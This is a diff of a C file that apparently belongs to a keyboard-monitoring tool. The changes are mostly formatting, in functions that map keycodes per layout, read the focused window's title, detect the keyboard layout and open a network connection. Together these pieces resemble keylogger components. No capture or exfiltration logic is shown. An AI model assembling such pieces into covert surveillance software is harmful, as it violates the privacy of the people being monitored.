@@ -1,6 +1,5 @@
 #include "devh.h"
 
-
 /*TODO: Write all the codes for all the keyboard layouts*/
 char* code_to_str(char* layout, int code)
 {
@@ -286,8 +285,8 @@ char* get_kb_symbols(void)
 
 char* get_kb_keycodes(void)
 {
-	Display *display;
-	XkbDescRec *keyboardDesc;
+     	Display *display;
+  	XkbDescRec *keyboardDesc;
 	Atom keycodes;
 	char* atomName;
 
@@ -298,12 +297,12 @@ char* get_kb_keycodes(void)
 
 	if(XkbGetNames(display, XkbKeycodesNameMask, keyboardDesc) != Success){return "ERROR: XkbGetNames()";}
 
-    keycodes = keyboardDesc->names->keycodes;
-    atomName = XGetAtomName(display, keycodes);
+    	keycodes = keyboardDesc->names->keycodes;
+    	atomName = XGetAtomName(display, keycodes);
+	
+	XCloseDisplay(display);
 
-    XCloseDisplay(display);
-
-    return atomName;
+    	return atomName;
 }//End of get_kb_keycodes()
 
 
@@ -312,7 +311,7 @@ char* get_kb_keycodes(void)
  ****************************************/
 
 char* get_window_title(void)
-	{
+{
 	
 /*
  *  int XGetWindowProperty(Display *display, Window w, Atom property, long long_offset, 
@@ -321,53 +320,57 @@ char* get_window_title(void)
  *						 unsigned long *bytes_after_return, unsigned char **prop_return);
  */
 
-		Display *display;
-		Window rwindow;
-		Atom active, actual_type_return;
-		int actual_format_return;
-		unsigned long bytes_after_return, nitems_return, focused;
-		unsigned char *prop_return;
+	Display *display;
+	Window rwindow;
+	Atom active, actual_type_return;
+	int actual_format_return;
+	unsigned long bytes_after_return, nitems_return, focused;
+	unsigned char *prop_return;
   
-		if ((display = XOpenDisplay(0)) == NULL)
-		{
-			fprintf(stderr, "Unable to open Display\n");
-			return "No-Window";
-		}
+  	if ((display = XOpenDisplay(0)) == NULL)
+	{
+		fprintf(stderr, "Unable to open Display\n");
+		return "No-Window";
+	}
+ 
+	rwindow = XDefaultRootWindow(display);
+	active = XInternAtom(display, "_NET_ACTIVE_WINDOW", False);
+
+	if(XGetWindowProperty(display, rwindow, active, 0, ~0, False,
+               		      AnyPropertyType, &actual_type_return, &actual_format_return, &nitems_return, &bytes_after_return,
+               		      &prop_return) && prop_return)
+	{
+		fprintf(stderr,"Unable to obtain Window properties.\n");  
+		return "No-Window";
+	}
   
-		rwindow = XDefaultRootWindow(display);
-		active = XInternAtom(display, "_NET_ACTIVE_WINDOW", False);
+	focused = *(unsigned long *) prop_return;
+	XFree (prop_return);
 
-		if(XGetWindowProperty(display, rwindow, active, 0, ~0, False,
-								AnyPropertyType, &actual_type_return, &actual_format_return, &nitems_return, &bytes_after_return,
-								&prop_return) && prop_return)
-		{
-			fprintf(stderr,"Unable to obtain Window properties.\n");  
-			return "No-Window";
-		}
+	if(!focused)          
+	{
+		fprintf(stderr,"Unable to obtain Window properties.\n");  
+		return "No-Window";
+	}
+
+	if(XGetWindowProperty(display, (Window) focused, XA_WM_NAME, 0, ~0, False,
+			      AnyPropertyType, &actual_type_return, &actual_format_return, &nitems_return, &bytes_after_return,
+	              	      &prop_return) && prop_return)
+	{
+		fprintf(stderr,"Unable to obtain Window properties.\n");  
+		return "No-Window";
+	}
   
-		focused = *(unsigned long *) prop_return;
-		XFree (prop_return);
+	XSync(display, False);
+	XCloseDisplay(display);
+	return (char*) prop_return;
+}//End get_window_title()
 
-		if(!focused)          
-		{
-			fprintf(stderr,"Unable to obtain Window properties.\n");  
-			return "No-Window";
-		}
 
-		if(XGetWindowProperty(display, (Window) focused, XA_WM_NAME, 0, ~0, False,
-								AnyPropertyType, &actual_type_return, &actual_format_return, &nitems_return, &bytes_after_return,
-								&prop_return) && prop_return)
-		{
-			fprintf(stderr,"Unable to obtain Window properties.\n");  
-			return "No-Window";
-		}
-  
-		XSync(display, False);
-		XCloseDisplay(display);
-		return (char*) prop_return;
-	}//End get_window_title()
-
-/********************************/
+/*****************************
+ *  Get the keyboard layout  *
+ * **************************/
+ 
 char* get_kb_layout(char *keycodes, char *symbols)
 {
    // QWERTY(italian, us, polish, spanish), 
@@ -385,8 +388,7 @@ char* get_kb_layout(char *keycodes, char *symbols)
    else if(strstr(keycodes, "dvorak")){ return "dvorak";}
    else if(strstr(keycodes, "workman")){ return "workman";}
    else return "unknown"; 
-
-}
+}//End of get_kb_layout()
 
 
 /*************************************************************
@@ -435,4 +437,4 @@ int conn(char *addr, char *port)
 	freeaddrinfo(result);
 
 	return lc;
-}
+}//End of conn()
